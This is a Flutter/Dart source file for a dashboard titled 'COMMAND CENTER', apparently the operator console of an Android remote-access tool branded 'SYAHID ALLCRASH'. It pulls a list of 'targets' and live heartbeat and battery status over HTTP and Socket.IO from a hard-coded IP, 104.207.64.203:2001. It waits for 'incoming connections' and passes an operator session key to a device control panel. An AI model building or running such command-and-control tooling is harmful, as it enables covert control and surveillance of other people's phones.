import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

// ═══════════════════════════════════════════════════════════════════════════
// THEME CONSTANTS — Synchronized with SYAHID ALLCRASH Design System
// ═══════════════════════════════════════════════════════════════════════════
class _C {
  static const bg = Color(0xFF0c0d15);
  static const bg2 = Color(0xFF11121c);
  static const surface = Color(0xFF161823);
  static const card = Color(0xFF1a1c29);
  static const accent = Color(0xFFe8184a);
  static const accent2 = Color(0xFFff4466);
  static const accent3 = Color(0xFFff8099);
  static const text = Color(0xFFE2EAE5);
  static const muted = Color(0x73E2EAE5);
  static const muted2 = Color(0x38E2EAE5);
  static const border = Color(0x1AE8184A);
  static const border2 = Color(0x0FFFFFFF);
  static const gold = Color(0xFFFFD447);
  static const green = Color(0xFF2BE67A);
  static const danger = Color(0xFFFF4D6D);
}

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String sessionKey;

  const DeviceDashboardPage({
    super.key,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";

  // Socket.IO config
  late IO.Socket _socket;

  @override
  void initState() {
    super.initState();
    _initializeVideo();
    _fetchDevices();
    _initSocket();

    _timer = Timer.periodic(const Duration(seconds: 10), (timer) {
      if (mounted) setState(() {});
    });

    _searchController.addListener(() {
      setState(() {
        _searchQuery = _searchController.text;
      });
    });
  }

  // ── Socket.IO ────────────────────────────────────────────────────────────

  void _initSocket() {
    try {
      _socket = IO.io(
        'http://104.207.64.203:2001',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_${widget.username}'})
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint("[+] Admin Socket Connected to Dashboard");
      });

      _socket.on('target_status', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['id']);
            if (index != -1) {
              _devices[index]['status'] =
                  data['status'].toString().toLowerCase() == 'online'
                  ? 'Online'
                  : 'Offline';
              if (data['status'].toString().toLowerCase() == 'online') {
                _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              }
            }
          });
        }
      });

      _socket.on('heartbeat', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
            if (index != -1) {
              _devices[index]['battery'] = data['battery'];
              _devices[index]['status'] = 'Online';
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
            }
          });
        }
      });

      _socket.on('device_info', (data) {
        if (mounted && data['admin'] == widget.username) {
          _fetchDevices();
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint("Socket error: $e");
    }
  }

  // ── Video Background ────────────────────────────────────────────────────

  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize()
            .then((_) {
              if (mounted) {
                setState(() {
                  _videoInitialized = true;
                });
                _videoController.setLooping(true);
                _videoController.play();
                _videoController.setVolume(0);
              }
            })
            .catchError((error) {
              debugPrint('Video initialization error: $error');
              if (mounted) setState(() => _videoError = true);
            });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) setState(() => _videoError = true);
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    _socket.disconnect();
    _socket.dispose();
    _videoController.dispose();
    _searchController.dispose();
    super.dispose();
  }

  // ── API ──────────────────────────────────────────────────────────────────

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse(
          "http://104.207.64.203:2001/api/list-targets?key=${widget.sessionKey}",
        ),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['ip']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline') return false;
    if (device['lastSeen'] == null) return false;

    try {
      DateTime lastSeen = DateTime.parse(device['lastSeen'].toString());
      DateTime now = DateTime.now();
      if (now.difference(lastSeen).inSeconds > 20) {
        return false;
      }
      return true;
    } catch (e) {
      return false;
    }
  }

  // ── Build ────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length;
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Video background
          if (_videoInitialized && !_videoError)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: const Color(0xFF0F1A15)),

          // Blur overlay
          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
            child: Container(color: Colors.black.withOpacity(0.6)),
          ),

          SafeArea(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // ── Header ──
                Container(
                  margin: const EdgeInsets.fromLTRB(14, 12, 14, 0),
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.5),
                    borderRadius: BorderRadius.circular(18),
                    border: Border.all(
                      color: _C.accent.withOpacity(0.2),
                      width: 1,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: _C.accent.withOpacity(0.05),
                        blurRadius: 20,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                  child: Row(
                    children: [
                      // Back button
                      GestureDetector(
                        onTap: () => Navigator.of(context).pop(),
                        child: Container(
                          width: 38,
                          height: 38,
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: Colors.white.withOpacity(0.1),
                            ),
                          ),
                          child: const Icon(
                            Icons.arrow_back_ios_new_rounded,
                            color: _C.muted,
                            size: 14,
                          ),
                        ),
                      ),
                      const SizedBox(width: 12),
                      // Title icon
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: _C.accent.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                            color: _C.accent.withOpacity(0.25),
                          ),
                        ),
                        child: const Icon(
                          Icons.security_rounded,
                          color: _C.accent,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text(
                              "COMMAND CENTER",
                              style: TextStyle(
                                color: Colors.white,
                                fontFamily: 'MADEEvolveSansEVO',
                                fontSize: 15,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 1.5,
                              ),
                            ),
                            const SizedBox(height: 2),
                            Text(
                              "Device Management - ${widget.username.toUpperCase()}",
                              style: TextStyle(
                                color: _C.muted2,
                                fontFamily: 'ShareTechMono',
                                fontSize: 9,
                                letterSpacing: 1.5,
                              ),
                            ),
                          ],
                        ),
                      ),
                      // Refresh button
                      GestureDetector(
                        onTap: () {
                          setState(() => _isLoading = true);
                          _fetchDevices();
                        },
                        child: Container(
                          width: 38,
                          height: 38,
                          decoration: BoxDecoration(
                            color: _C.surface,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(color: _C.border2),
                          ),
                          child: const Icon(
                            Icons.refresh_rounded,
                            color: _C.muted,
                            size: 15,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 12),

                // ── Stats Row ──
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  child: Row(
                    children: [
                      _buildStatBox(
                        "TOTAL",
                        totalCount.toString(),
                        _C.text,
                        _C.card,
                      ),
                      const SizedBox(width: 10),
                      _buildStatBox(
                        "ONLINE",
                        activeCount.toString(),
                        _C.green,
                        _C.green.withOpacity(0.12),
                      ),
                      const SizedBox(width: 10),
                      _buildStatBox(
                        "OFFLINE",
                        offlineCount.toString(),
                        _C.danger,
                        _C.danger.withOpacity(0.12),
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 12),

                // ── Search Bar ──
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  child: Container(
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.4),
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(color: _C.border2),
                    ),
                    padding: const EdgeInsets.fromLTRB(14, 3, 3, 3),
                    child: TextField(
                      controller: _searchController,
                      style: const TextStyle(
                        color: _C.text,
                        fontFamily: 'ShareTechMono',
                        fontSize: 13,
                        letterSpacing: 0.5,
                      ),
                      cursorColor: _C.accent,
                      decoration: InputDecoration(
                        hintText: "Search device, IP, ID...",
                        hintStyle: TextStyle(
                          color: _C.muted2,
                          fontFamily: 'ShareTechMono',
                          fontSize: 13,
                        ),
                        prefixIcon: Icon(
                          Icons.search_rounded,
                          color: _C.muted2,
                          size: 18,
                        ),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(
                          vertical: 14,
                        ),
                      ),
                    ),
                  ),
                ),

                const SizedBox(height: 10),

                // ── Device List ──
                Expanded(
                  child: _isLoading
                      ? const Center(
                          child: CircularProgressIndicator(color: _C.accent),
                        )
                      : filteredList.isEmpty
                      ? Center(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Container(
                                padding: const EdgeInsets.all(20),
                                decoration: BoxDecoration(
                                  color: Colors.black.withOpacity(0.3),
                                  borderRadius: BorderRadius.circular(16),
                                  border: Border.all(color: _C.border2),
                                ),
                                child: Column(
                                  children: [
                                    Icon(
                                      Icons.devices_other_rounded,
                                      color: _C.muted2,
                                      size: 40,
                                    ),
                                    const SizedBox(height: 12),
                                    const Text(
                                      "NO DEVICES FOUND",
                                      style: TextStyle(
                                        color: _C.muted,
                                        fontFamily: 'MADEEvolveSansEVO',
                                        fontSize: 12,
                                        fontWeight: FontWeight.bold,
                                        letterSpacing: 2,
                                      ),
                                    ),
                                    const SizedBox(height: 6),
                                    Text(
                                      "Waiting for incoming connections...",
                                      style: TextStyle(
                                        color: _C.muted2,
                                        fontFamily: 'ShareTechMono',
                                        fontSize: 10,
                                        letterSpacing: 1,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        )
                      : ListView.builder(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 14,
                            vertical: 5,
                          ),
                          itemCount: filteredList.length,
                          itemBuilder: (context, index) {
                            final device = filteredList[index];
                            bool isActive = _isDeviceReallyOnline(device);
                            Color glowColor = isActive ? _C.green : _C.danger;

                            return GestureDetector(
                              onTap: () {
                                Navigator.pushNamed(
                                  context,
                                  '/control_panel',
                                  arguments: {
                                    "device": device,
                                    "operator": widget.username,
                                    "sessionKey": widget.sessionKey,
                                  },
                                );
                              },
                              child: Container(
                                margin: const EdgeInsets.only(bottom: 10),
                                padding: const EdgeInsets.all(14),
                                decoration: BoxDecoration(
                                  color: Colors.black.withOpacity(0.5),
                                  borderRadius: BorderRadius.circular(16),
                                  border: Border.all(
                                    color: isActive
                                        ? glowColor.withOpacity(0.3)
                                        : _C.border2,
                                    width: 1,
                                  ),
                                  boxShadow: isActive
                                      ? [
                                          BoxShadow(
                                            color: glowColor.withOpacity(0.06),
                                            blurRadius: 15,
                                            spreadRadius: 1,
                                          ),
                                        ]
                                      : [],
                                ),
                                child: Row(
                                  children: [
                                    // Device icon
                                    Container(
                                      padding: const EdgeInsets.all(10),
                                      decoration: BoxDecoration(
                                        color: isActive
                                            ? glowColor.withOpacity(0.12)
                                            : Colors.white.withOpacity(0.04),
                                        borderRadius: BorderRadius.circular(12),
                                        border: Border.all(
                                          color: isActive
                                              ? glowColor.withOpacity(0.4)
                                              : Colors.transparent,
                                        ),
                                      ),
                                      child: Icon(
                                        Icons.phone_android_rounded,
                                        color: isActive ? glowColor : _C.muted2,
                                        size: 18,
                                      ),
                                    ),
                                    const SizedBox(width: 14),

                                    // Device info
                                    Expanded(
                                      child: Column(
                                        crossAxisAlignment:
                                            CrossAxisAlignment.start,
                                        children: [
                                          Text(
                                            device['model'] ?? "Unknown Device",
                                            style: const TextStyle(
                                              color: _C.text,
                                              fontSize: 13,
                                              fontWeight: FontWeight.bold,
                                              fontFamily: 'ShareTechMono',
                                              letterSpacing: 0.5,
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          const SizedBox(height: 4),
                                          Row(
                                            children: [
                                              Text(
                                                device['release'] != null
                                                    ? "Android ${device['release']}"
                                                    : "Android OS",
                                                style: TextStyle(
                                                  color: _C.muted2,
                                                  fontSize: 10,
                                                  fontFamily: 'ShareTechMono',
                                                ),
                                              ),
                                              const SizedBox(width: 8),
                                              Icon(
                                                Icons.wifi_rounded,
                                                color: isActive
                                                    ? glowColor.withOpacity(0.5)
                                                    : _C.muted2,
                                                size: 11,
                                              ),
                                            ],
                                          ),
                                        ],
                                      ),
                                    ),

                                    // Status & battery
                                    Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.end,
                                      children: [
                                        Row(
                                          children: [
                                            Container(
                                              width: 7,
                                              height: 7,
                                              decoration: BoxDecoration(
                                                color: glowColor,
                                                shape: BoxShape.circle,
                                                boxShadow: [
                                                  BoxShadow(
                                                    color: glowColor
                                                        .withOpacity(0.5),
                                                    blurRadius: 5,
                                                    spreadRadius: 1,
                                                  ),
                                                ],
                                              ),
                                            ),
                                            const SizedBox(width: 5),
                                            Text(
                                              isActive ? "Online" : "Offline",
                                              style: TextStyle(
                                                color: isActive
                                                    ? _C.green
                                                    : _C.muted2,
                                                fontSize: 11,
                                                fontWeight: FontWeight.w600,
                                                fontFamily: 'ShareTechMono',
                                              ),
                                            ),
                                          ],
                                        ),
                                        const SizedBox(height: 6),
                                        Row(
                                          children: [
                                            Icon(
                                              Icons
                                                  .battery_charging_full_rounded,
                                              color:
                                                  (device['battery'] != null &&
                                                      int.tryParse(
                                                            device['battery']
                                                                .toString(),
                                                          ) !=
                                                          null &&
                                                      int.parse(
                                                            device['battery']
                                                                .toString(),
                                                          ) <=
                                                          20)
                                                  ? _C.danger
                                                  : _C.muted2,
                                              size: 11,
                                            ),
                                            const SizedBox(width: 4),
                                            Text(
                                              "${device['battery'] ?? '0'}%",
                                              style: TextStyle(
                                                color:
                                                    (device['battery'] !=
                                                            null &&
                                                        int.tryParse(
                                                              device['battery']
                                                                  .toString(),
                                                            ) !=
                                                            null &&
                                                        int.parse(
                                                              device['battery']
                                                                  .toString(),
                                                            ) <=
                                                            20)
                                                    ? _C.danger
                                                    : _C.muted2,
                                                fontSize: 10,
                                                fontFamily: 'ShareTechMono',
                                              ),
                                            ),
                                          ],
                                        ),
                                      ],
                                    ),

                                    const SizedBox(width: 10),
                                    Icon(
                                      Icons.arrow_forward_ios_rounded,
                                      color: _C.muted2.withOpacity(0.4),
                                      size: 12,
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── Stat Box ─────────────────────────────────────────────────────────────

  Widget _buildStatBox(
    String title,
    String value,
    Color valueColor,
    Color bgColor,
  ) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.border2),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                color: valueColor,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 3),
            Text(
              title,
              style: const TextStyle(
                fontFamily: 'ShareTechMono',
                color: _C.muted,
                fontSize: 9,
                letterSpacing: 1.5,
              ),
            ),
          ],
        ),
      ),
    );
  }
}
